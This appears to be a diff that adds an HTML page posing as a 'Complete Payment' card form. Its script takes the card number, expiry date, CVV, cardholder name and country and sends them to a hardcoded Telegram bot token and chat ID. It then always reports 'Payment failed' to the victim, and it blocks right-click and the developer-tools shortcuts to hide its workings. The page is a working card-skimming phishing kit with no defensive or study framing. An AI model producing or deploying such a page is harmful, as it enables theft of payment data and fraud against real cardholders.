@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Complete Payment Form</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #1f1c2c, #928dab);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      padding: 20px;
+    }
+    .payment-form {
+      background: white;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
+      width: 100%;
+      max-width: 380px;
+      transition: transform 0.3s ease;
+    }
+    .payment-form:hover {
+      transform: scale(1.05);
+    }
+    .payment-form h2 {
+      text-align: center;
+      color: #333;
+      font-size: 22px;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+    .form-group {
+      margin-bottom: 12px;
+    }
+    .form-group label {
+      font-size: 13px;
+      color: #555;
+    }
+    .form-group input, .form-group select {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      margin-top: 5px;
+      font-size: 14px;
+    }
+    .payment-methods {
+      display: flex;
+      justify-content: space-evenly;
+      margin-top: 20px;
+      flex-wrap: wrap;
+    }
+    .payment-methods i {
+      font-size: 35px;
+      cursor: pointer;
+      transition: transform 0.3s ease;
+      margin: 5px;
+    }
+    .payment-methods i:hover {
+      transform: scale(1.1);
+    }
+    .submit-btn {
+      width: 100%;
+      padding: 14px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s, transform 0.2s ease;
+    }
+    .submit-btn:hover {
+      background-color: #45a049;
+      transform: translateY(-2px);
+    }
+    .form-group input:focus {
+      border: 1px solid #4CAF50;
+      outline: none;
+    }
+    /* Mobile friendly */
+    @media (max-width: 600px) {
+      .payment-form {
+        padding: 18px;
+        max-width: 95%;
+      }
+      .payment-methods {
+        justify-content: center;
+      }
+    }
+  </style>
+  <script>
+    // Blocking right-click and developer tools
+    document.addEventListener("contextmenu", function(e) {
+      e.preventDefault();
+    });
+    document.addEventListener("keydown", function(e) {
+      if (e.ctrlKey && (e.key === "u" || e.key === "U" || e.key === "i" || e.key === "I" || e.key === "j" || e.key === "J" || e.key === "s" || e.key === "S" || e.key === "h" || e.key === "H")) {
+        e.preventDefault();
+      }
+      if (e.keyCode == 123) {
+        e.preventDefault();
+      }
+    });
+  </script>
+</head>
+<body>
+  <div class="payment-form">
+    <h2>Complete Payment</h2>
+    <form id="paymentForm">
+      <div class="form-group">
+        <label>Payment Method</label>
+        <div class="payment-methods">
+          <i class="fab fa-cc-visa" style="color: #1A1F71;" title="Visa"></i>
+          <i class="fab fa-cc-mastercard" style="color: #F6A800;" title="MasterCard"></i>
+          <i class="fab fa-cc-amex" style="color: #0033A0;" title="American Express"></i>
+          <i class="fab fa-btc" style="color: #F2A900;" title="Binance"></i> <!-- Correct Binance Icon -->
+        </div>
+      </div>
+      <div class="form-group">
+        <label for="card-number">Card Number</label>
+        <input type="text" id="card-number" name="card-number" placeholder="1234 5678 9876 5432" maxlength="16" required>
+      </div>
+      <div class="form-group">
+        <label for="expiry-date">Expiry Date</label>
+        <input type="text" id="expiry-date" name="expiry-date" placeholder="MM/YY" required maxlength="5">
+      </div>
+      <div class="form-group">
+        <label for="cvv">CVV \ CVC</label>
+        <input type="text" id="cvv" name="cvv" placeholder="123" required>
+      </div>
+      <div class="form-group">
+        <label for="card-holder-name">Card Holder's Name</label>
+        <input type="text" id="card-holder-name" name="card-holder-name" placeholder="Full Name on Card" required>
+      </div>
+      <div class="form-group">
+        <label for="country">Country</label>
+        <select id="country" name="country" required>
+          <option value="us">United States</option>
+          <option value="ca">Canada</option>
+          <option value="uk">United Kingdom</option>
+          <option value="bd">Bangladesh</option>
+          <option value="in">India</option>
+        </select>
+      </div>
+      <button type="submit" class="submit-btn">Submit Payment</button>
+    </form>
+  </div>
+
+  <script>
+    // Format Expiry Date
+    document.getElementById("expiry-date").addEventListener("input", function(e) {
+      let value = e.target.value;
+      if (value.length === 2 && !value.includes("/")) {
+        e.target.value = value + "/";
+      }
+    });
+
+    // Submit form and send to Telegram
+    document.getElementById('paymentForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      // Collect Form Data
+      const cardNumber = document.getElementById("card-number").value;
+      const expiryDate = document.getElementById("expiry-date").value;
+      const cvv = document.getElementById("cvv").value;
+      const cardHolderName = document.getElementById("card-holder-name").value;
+      const country = document.getElementById("country").options[document.getElementById("country").selectedIndex].text;
+
+      // Create Telegram Message
+      let message = `💳 **Payment Attempted** 🚀\n\n` +
+                    `🔹 **Card Number:** \`${cardNumber}\`\n` +
+                    `🔹 **Expiry Date:** \`${expiryDate}\`\n` +
+                    `🔹 **CVV:** \`${cvv}\`\n` +
+                    `🔹 **Full Name on Card:** \`${cardHolderName}\`\n` +
+                    `🔹 **Country:** \`${country}\`\n\n` +
+                    `⚠️ **Note:** Check details carefully!`;
+
+      // Send the details to Telegram
+      fetch(`https://api.telegram.org/bot7590766158:AAFTMfMpGQkg_4iw3UyOiGX4NdarPIvcwRE/sendMessage`, {
+        method: 'POST',
+        body: JSON.stringify({
+          chat_id: "6807445600",
+          text: message,
+          parse_mode: "Markdown",
+        }),
+        headers: {
+          'Content-Type': 'application/json'
+        }
+      }).then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            alert("Payment failed! Unbelievable details!");
+          } else {
+            alert("Payment failed! Unbelievable details!");
+          }
+        })
+        .catch(error => {
+          console.error("Telegram API Error:", error);
+          alert("Payment failed! Unbelievable details!");
+        });
+    });
+  </script>
+</body>
+</html>
